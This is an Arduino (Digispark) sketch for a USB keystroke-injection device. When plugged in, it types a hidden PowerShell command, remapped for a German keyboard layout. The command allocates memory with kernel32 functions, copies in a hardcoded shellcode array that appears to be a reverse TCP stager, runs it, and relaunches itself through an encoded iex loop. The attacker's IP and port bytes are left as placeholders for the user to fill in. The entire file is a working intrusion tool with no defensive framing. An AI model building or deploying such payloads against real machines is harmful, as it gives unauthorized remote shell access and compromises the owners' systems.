
#include "DigiKeyboard.h"

#define LongDelay 3000

void setup() {
  // don't need to set anything up to use DigiKeyboard
  pinMode(0, OUTPUT); //LED on Model B
  pinMode(1, OUTPUT); //LED on Model A  or Pro

  // this is generally not necessary but with some older systems it seems to
  // prevent missing the first character after a delay:
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(300);
  
  // Type out this string letter by letter on the computer (assumes US-style
  // keyboard)
  //DigiKeyboard.print("cmd.exe &T>01 &K mode CON> COLS)15 LINES)1");
  DigiKeyboard.print("notepad");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);

  DigiKeyboard.delay(LongDelay);

  //US-GER Layout Replacements
  // : --- >
  // ( --- *
  // ) --- (
  // = --- )
  // z --- y
  // - --- /
  // " --- @
  // ' --- |
  // ; --- <
  // [
  // ]
  // {
  // }  
  
  
/*  DigiKeyboard.print("if exist C>");
  BSlash(2);
  DigiKeyboard.print("Windows");
  BSlash(2);
  DigiKeyboard.print("SzsWOW64 * set PWRSHLXDD)C>");
  BSlash(2);
  DigiKeyboard.print("Windows");
  BSlash(2);
  DigiKeyboard.print("SzsWOW64");
  BSlash(2);
  DigiKeyboard.print("WindowsPowerShell");
  BSlash(2);
  DigiKeyboard.print("v1.0");
  BSlash(2);
  DigiKeyboard.print("powershell( else * set PWRSHLXDD)powershell (");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
*/
 // DropTheBomb();
DigiKeyboard.print("%PWRSHLXDD% /nop /w hidden /c ");
  BSlash(1);
  DigiKeyboard.print(";@$1 ) |$c ) ||@(<");
  DigiKeyboard.print(""); 
  OBracket(false); 
  DigiKeyboard.print("DllImport*");
  BSlash(3);
  DigiKeyboard.print("@kernel32.dll");
  BSlash(3);
  DigiKeyboard.print("@("); 
  CBracket(false); 
  DigiKeyboard.print("public static ext");
  DigiKeyboard.print("ern IntPtr VirtualAlloc*IntPtr lpAddress, uint dwS");
  DigiKeyboard.print("ize, uint flAllocationTzpe, uint flProtect(<"); OBracket(false); 
  DigiKeyboard.print("DllIm");
  DigiKeyboard.print("port*");
  BSlash(3);
  DigiKeyboard.print("@kernel32.dll");
  BSlash(3);
  DigiKeyboard.print("@("); 
  CBracket(false); 
  DigiKeyboard.print("public static extern In");
  DigiKeyboard.print("tPtr CreateThread*IntPtr lpThreadAttributes, uint ");
  DigiKeyboard.print("dwStackSize, IntPtr lpStartAddress, IntPtr lpParam");
  DigiKeyboard.print("eter, uint dwCreationFlags, IntPtr lpThreadId(<"); 
  OBracket(false); 
  DigiKeyboard.print("Dl");
  DigiKeyboard.print("lImport*");
  BSlash(3);
  DigiKeyboard.print("@msvcrt.dll");
  BSlash(3);
  DigiKeyboard.print(";@("); 
  CBracket(false); 
  DigiKeyboard.print("public static extern I");
  DigiKeyboard.print("ntPtr memset*IntPtr dest, uint src, uint count(<||");
  DigiKeyboard.print("<$w ) Add/Tzpe /memberDefinition $c /Name ");
  BSlash(3);
  DigiKeyboard.print("@Win32");
  BSlash(3);
  DigiKeyboard.print("@ /namespace Win32Functions /passthru<"); 
  OBracket(false); 
  DigiKeyboard.print("Bzte"); 
  OBracket(false); 
  CBracket(false);  
  CBracket(false); 
  DigiKeyboard.print("<"); 
  OBracket(false); 
  DigiKeyboard.print("Bzte"); 
  OBracket(false); 
  CBracket(false); 
  CBracket(false); 
  DigiKeyboard.print("$sc ) 0xfc,0xe8,0x89,0x00,0x00,0x00,0x60,");
  DigiKeyboard.print("0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,");
  DigiKeyboard.print("0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,");
  DigiKeyboard.print("0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,");
  DigiKeyboard.print("0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf0,0x52,");
  DigiKeyboard.print("0x57,0x8b,0x52,0x10,0x8b,0x42,0x3c,0x01,0xd0,0x8b,");
  DigiKeyboard.print("0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,");
  DigiKeyboard.print("0x48,0x18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,");
  DigiKeyboard.print("0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0x31,0xc0,0xac,");
  DigiKeyboard.print("0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf4,0x03,");
  DigiKeyboard.print("0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,");
  DigiKeyboard.print("0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,");
  DigiKeyboard.print("0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,");
  DigiKeyboard.print("0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,");
  DigiKeyboard.print("0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,");
  DigiKeyboard.print("0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,");
  DigiKeyboard.print("0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,");
  DigiKeyboard.print("0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,");
  DigiKeyboard.print("0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,");
  DigiKeyboard.print("0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,");
  
 // "); OBracket(false); DigiKeyboard.print("0x@@,0x@@,0x@@,0x@@"); CBracket(false); DigiKeyboard.print(",0x68,0x02,0x00,"); OBracket(false); DigiKeyboard.print("0x@@,0x@@"); CBracket(false); DigiKeyboard.print(",0
  
  // MAKE SURE YOU DELETE THE BRACKETS.
  // DO NOT PASS GO UNTIL YOU DELETE THE BRACKETS.
  
  DigiKeyboard.print("x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0");
  DigiKeyboard.print("x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xff,0x4e,0x08,0");
  DigiKeyboard.print("x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0");
  DigiKeyboard.print("x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0");
  DigiKeyboard.print("xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0");
  DigiKeyboard.print("x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0");
  DigiKeyboard.print("xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0");
  DigiKeyboard.print("xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0");
  DigiKeyboard.print("xf6,0x75,0xec,0xc3<$size ) 0x1000<if *$sc.Length /");
  DigiKeyboard.print("gt 0x1000("); 
  OBracket(true); 
  DigiKeyboard.print("$size ) $sc.Length"); 
  CBracket(true); 
  DigiKeyboard.print("<$x)$w>>VirtualAlloc");
  DigiKeyboard.print("*0,0x1000,$size,0x40(<for *$i)0<$i /le *$sc.Length");
  DigiKeyboard.print("/1(<$i++( "); 
  OBracket(true); 
  DigiKeyboard.print("$w>>memset*"); 
  OBracket(false); 
  DigiKeyboard.print("IntPtr"); 
  CBracket(false); 
  DigiKeyboard.print("*$x.ToInt32*(+$i(, $");
  DigiKeyboard.print("sc"); 
  OBracket(false); 
  DigiKeyboard.print("$i"); 
  CBracket(false); 
  DigiKeyboard.print(", 1("); 
  CBracket(true); 
  DigiKeyboard.print("<$w>>CreateThread*0,0,$x,0,0,0(<for *<<");
  DigiKeyboard.print("("); 
  OBracket(true); 
  DigiKeyboard.print("Start/sleep 60"); 
  CBracket(true); 
  DigiKeyboard.print("<|<$gq ) "); 
  OBracket(false); 
  DigiKeyboard.print("Szstem.Convert"); 
  CBracket(false); 
  DigiKeyboard.print(">>ToBase");
  DigiKeyboard.print("64String*");
  OBracket(false); 
  DigiKeyboard.print("Szstem.Text.Encoding"); 
  CBracket(false); 
  DigiKeyboard.print(">>Unicode.GetBztes*");
  DigiKeyboard.print("$1((<if*"); 
  OBracket(false); 
  DigiKeyboard.print("IntPtr"); 
  CBracket(false); 
  DigiKeyboard.print(">>Size /eq 8("); 
  OBracket(true); 
  DigiKeyboard.print("$x86 ) $env>SzstemRo");
  DigiKeyboard.print("ot + ");
  BSlash(3);
  DigiKeyboard.print("@");
  BSlash(4);
  DigiKeyboard.print("szswow64");
  BSlash(4);
  DigiKeyboard.print("WindowsPowerShell");
  BSlash(4);
  DigiKeyboard.print(";v1.0");
  BSlash(4);
  DigiKeyboard.print("powershell");
  BSlash(3);
  DigiKeyboard.print("@<$cmd ) ");
  BSlash(3);
  DigiKeyboard.print("@/nop /noni /enc ");
  BSlash(3);
  DigiKeyboard.print("@<iex ");
  BSlash(3);
  DigiKeyboard.print("@ $x86 $cmd $gq");
  BSlash(3);
  DigiKeyboard.print("@"); 
  CBracket(true); 
  DigiKeyboard.print("else"); 
  OBracket(true); 
  DigiKeyboard.print("$cmd ) ");
  BSlash(3);
  DigiKeyboard.print("@/nop /*@noni /enc");
  BSlash(3);
  DigiKeyboard.print("@<iex ");
  BSlash(3);
  DigiKeyboard.print("@ powershell $cmd $gq");
  BSlash(3);
  DigiKeyboard.print("@<"); 
  CBracket(true); 
  BSlash(1);
  DigiKeyboard.print("@");

 
  // It's better to use DigiKeyboard.delay() over the regular Arduino delay()
  // if doing keyboard stuff because it keeps talking to the computer to make
  // sure the computer knows the keyboard is alive and connected
  digitalWrite(0, HIGH);   // turn the LED on (HIGH is the voltage level)
  digitalWrite(1, HIGH);
    
  DigiKeyboard.delay(LongDelay);
}


void loop() {
  
}

void BSlash(byte slashes) {
  //for(byte i = 0; i<slashes; i++){
    DigiKeyboard.sendKeyStroke(0x2D, MOD_ALT_RIGHT);
  //}
 }

 void OBracket(boolean curly) {
  if(curly){
    DigiKeyboard.sendKeyStroke(0x2F, MOD_SHIFT_LEFT);
  } else {
    DigiKeyboard.sendKeyStroke(0x2D);
  }
 }

  void CBracket(boolean curly) {
  if(curly){
    DigiKeyboard.sendKeyStroke(0x30, MOD_SHIFT_LEFT);
  } else {
    DigiKeyboard.sendKeyStroke(0x30);
  }
 }



